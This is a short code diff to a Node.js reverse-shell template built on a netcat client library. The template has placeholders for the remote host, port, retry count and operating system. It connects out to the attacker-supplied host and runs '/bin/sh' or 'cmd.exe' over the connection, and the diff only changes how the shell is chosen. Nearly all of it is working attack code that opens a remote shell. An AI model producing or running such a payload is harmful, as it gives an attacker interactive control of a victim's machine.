@@ -2,14 +2,14 @@ var NetcatClient = require('netcat').client
 const $ = require('cash')
 
 var nc = new NetcatClient()
-var cmd = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh'
 
 // Marker replaced at runtime.
+var CMD = '{{os}}' === 'win' ? 'cmd.exe' : '/bin/sh'
 var RHOST = '{{rhost}}'
 var RPORT = {{rport}}
 var RETRY = {{retry}}
 
-nc.addr(RHOST).port(RPORT).retry(RETRY).connect().exec(cmd)
+nc.addr(RHOST).port(RPORT).retry(RETRY).connect().exec(CMD)
 
 nc.filter(function (chunk, enc, next) {
   if (chunk.toString().indexOf('cash') === 0){
